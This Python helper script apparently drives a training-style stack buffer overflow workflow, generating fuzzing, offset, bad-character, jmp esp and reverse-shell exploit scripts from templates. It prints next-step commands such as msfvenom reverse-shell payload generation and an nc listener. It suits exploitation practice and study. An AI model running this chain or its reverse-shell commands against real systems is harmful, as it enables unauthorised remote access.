#!/bin/python3
import argparse, os, sys, toml


# Inspired by Tib3rius's autorecon

# TODO

## read argument value
## read toml config file

## check the argument for specific generate script
## if the argument not fit the script check the config file 

## add suggest for next command

# code

## read arguments

VERSION = "0.0.1"

class Simpleoverflowhelper:
    def __init__(self):
        self.config = None
        self.argparse = None

simpleoverflowhelper = Simpleoverflowhelper()

def autoupdate_config():
    config = {}
    config["host"] = simpleoverflowhelper.config["host"]
    config["port"] = simpleoverflowhelper.config["port"]
    config["prefix"] = simpleoverflowhelper.config["prefix"]
    config["pattern"] = simpleoverflowhelper.config["pattern"]
    config["offset"] = simpleoverflowhelper.config["offset"]
    config["badchar"] = simpleoverflowhelper.config["badchar"]
    config["jmpaddress"] = simpleoverflowhelper.config["jmpaddress"]
    config["shellfile"] = simpleoverflowhelper.config["shellfile"]
    # print(config, os.path.join(os.getcwd(), 'config.toml'))
    with open(os.path.join(os.getcwd(), 'config.toml'), 'w') as fw:
        toml.dump(config, fw)

def gen1():
    filename = "1-fuzzer.py"
    template_filename = "1-fuzzer-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    print("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $crashed_byte")
    print("./simpleoverflowhelper.py 2 -g $pattern")
    pass

def gen2():
    filename = "2-offset.py"
    template_filename = "2-offset-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    print("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $crashed_byte -q $overwritten_eip_pattern")
    print("./simpleoverflowhelper.py 3 --offset $offset")
    pass

def gen3():
    filename = "3-verify-overwritten.py"
    template_filename = "3-verify-overwritten-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    print("./3-verify-overwritten.py")
    print("./simpleoverflowhelper.py 4 -b \"\"")
    print("./simpleoverflowhelper.py 4 -b \"0\"")
    print("./simpleoverflowhelper.py 4 -b \"0,a\"")
    pass

def gen4():
    filename = "4-find-badchars.py"
    template_filename = "4-find-badchars-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    print("You might have not collected all bad chars also \\x00 is hightly one of them:")
    print("./simpleoverflowhelper.py 4 -b \"" + simpleoverflowhelper.config["badchar"] + "\"")
    print("After got all bad chars try to get the address of jmp esp instruction with no protection: ")
    print("./simpleoverflowhelper.py 5 -j 65332193")
    print("./4-find-badchars.py")
    pass

def gen5():
    filename = "5-verifiy-jmp-pointer.py"
    template_filename = "5-verifiy-jmp-pointer-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip")
    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip > shell.txt")
    print("nc -lnvp 4444")
    print("./simpleoverflowhelper.py 6 -s shell.txt")
    print("./5-verifiy-jmp-pointer.py")
    pass

def gen6():
    filename = "6-get-reverse-shell.py"
    template_filename = "6-get-reverse-shell-template.py"
    if "output" in  simpleoverflowhelper.config:
        filename = simpleoverflowhelper.config["output"]
    fw = open(filename, 'w')
    fr = open(template_filename, 'r')
    template_lines = fr.readlines()
    for line in template_lines:
        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
        fw.write(line)
    fw.close()
    fr.close()
    
    autoupdate_config()
    
    os.chmod(filename, 0o777)

    print("You might want to run after the sctipt command: ")
    print("./" + filename)
    pass

def main():
    config = {'host': '', 'port': '', 'prefix': '', 'pattern': '', 'offset': '', 'badchar': '', 'jmpaddress': '', 'shellfile': ''}
    if os.path.isfile(os.path.join(os.getcwd(), 'config.toml')): 
        config = toml.load(os.path.join(os.getcwd(), 'config.toml'))

    simpleoverflowhelper.config = config
    
    parser = argparse.ArgumentParser(add_help=False, description='Basic Bufferoverflow value repaster and suggesster.Instead of have to repaste an command output, ip, port, etc. This tool do it for you and also suggest next step to do.')
    parser.add_argument('generatestep', action='store', type=int, help='The bufferoverflow step (e.g. 1)', nargs='?')
    parser.add_argument('-h', '--host', action='store', help='IP addresses of target host (e.g. 10.0.0.1)')
    parser.add_argument('-p', '--port', action='store', type=int, help='The vulnerable to bufferoverflow service port (e.g. 9999)')
    parser.add_argument('-r', '--prefix', action='store', type=str, help='The bufferoverflow prefix before send value to actual vulnerable input field (e.g. "TRUN ")')
    parser.add_argument('-g', '--pattern', action='store', type=str, help='The generated pattern from msf pattern_create.rb (e.g. Aa0Aa1Aa2Aa3Aa4Aa5Aa)')
    parser.add_argument('-b', '--badchar', action='store', type=str, help='The bufferoverflow step (e.g. 0,a)')
    parser.add_argument('--offset', action='store', type=str, help='The bufferoverflow step payload offset before replace the EIP regeister value. (e.g. 2003)')
    parser.add_argument('-j', '--jmpaddress', action='store', type=str, help='The bufferoverflow jump to esp address (e.g. 65459201)')
    parser.add_argument('-s', '--shellfile', action='store', type=str, help='A filename contain the reverse shell code generated from msfvenom. (e.g. reverseshell.txt)')
    parser.add_argument('-o', '--output', action='store', type=str, help='Specify output file name. If not specified will be the template file name without template word. (e.g. 1-fuzzer.py)')
    parser.add_argument('--version', action='store_true', help='Prints the Simple Overflow Helper version and exits.')
    args, unknown = parser.parse_known_args()

    simpleoverflowhelper.argparse = parser
    
    if args.version:
        print('Simple Overflow Helper v' + VERSION)
        sys.exit(0)
    
    def unknown_help():
        if '--help' in unknown:
            parser.print_help()
            print()

    unknown_help()
    # print(args)
    
    if not args.generatestep:
        parser.print_help()
        sys.exit(0)
    
    # print(config)

    if args.output:
        simpleoverflowhelper.config["output"] = args.output

    if args.generatestep == 1:
        if not (args.host is None) and not (args.port is None) and not (args.prefix is None):
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
        elif  config["host"] != "" and config["port"] != "" :
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen1()
            
    elif args.generatestep == 2:
        # check previous step configuration
        # todo: change to -> can config some value without have to provide already in config file
        # todo: add warning which argument not provide or have wrong format
        if args.host and args.port and args.prefix:
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
        elif  config["host"] == "" or config["port"] == "" :
            print("Somehow config from previous had been lost")
            sys.exit(0)
        # check current step configuration
        if not (args.pattern is None):
            simpleoverflowhelper.config["pattern"] = args.pattern
        elif  config["pattern"] != "":
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen2()

    elif args.generatestep == 3:
        # check previous step configuration
        # todo: change to can config some value without have to provide already in config file
        # todo: add warning which argument not provide or have wrong format
        if args.host and args.port and args.prefix:
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
        elif  config["host"] == "" or config["port"] == "" :
            print("Somehow config from previous had been lost")
            sys.exit(0)
        # check current step configuration
        if not (args.offset is None):
            simpleoverflowhelper.config["offset"] = args.offset
        elif  config["offset"] != "":
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen3()

    elif args.generatestep == 4:
        # check previous step configuration
        # todo: change to can config some value without have to provide already in config file
        # todo: add warning which argument not provide or have wrong format
        if args.host and args.port and args.prefix and args.offset:
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
            simpleoverflowhelper.config["offset"] = args.offset
        elif  config["host"] == "" or config["port"] == "" or config["offset"] == "" :
            print("Somehow config from previous had been lost")
            sys.exit(0)
        # check current step configuration
        if not (args.badchar is None):
            simpleoverflowhelper.config["badchar"] = args.badchar
        elif  config["badchar"] != "":
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen4()

    elif args.generatestep == 5:
        # check previous step configuration
        # todo: change to can config some value without have to provide already in config file
        # todo: add warning which argument not provide or have wrong format
        if args.host and args.port and args.prefix and args.offset:
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
            simpleoverflowhelper.config["offset"] = args.offset
        elif  config["host"] == "" or config["port"] == "" or config["offset"] == "" :
            print("Somehow config from previous had been lost")
            sys.exit(0)
        # check current step configuration
        if not (args.jmpaddress is None):
            simpleoverflowhelper.config["jmpaddress"] = args.jmpaddress
        elif  config["jmpaddress"] != "":
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen5()

    elif args.generatestep == 6:
        # check previous step configuration
        # todo: change to can config some value without have to provide already in config file
        # todo: add warning which argument not provide or have wrong format
        if args.host and args.port and args.prefix and args.offset and args.jmpaddress:
            simpleoverflowhelper.config["host"] = args.host
            simpleoverflowhelper.config["port"] = args.port
            simpleoverflowhelper.config["prefix"] = args.prefix
            simpleoverflowhelper.config["offset"] = args.offset
            simpleoverflowhelper.config["jmpaddress"] = args.jmpaddress
        elif config["host"] == "" or config["port"] == "" or config["offset"] == "" or config["jmpaddress"] == "":
            print("Somehow config from previous had been lost")
            sys.exit(0)
        # check current step configuration
        if not (args.shellfile is None):
            simpleoverflowhelper.config["shellfile"] = args.shellfile
        elif  config["shellfile"] != "":
            pass
        else:
            print("Err: Not found any configuration to generate script")
            parser.print_help()
            sys.exit(0)
        gen6()

    else:
        parser.print_help()
        sys.exit(0)

if __name__ == '__main__':
	main()
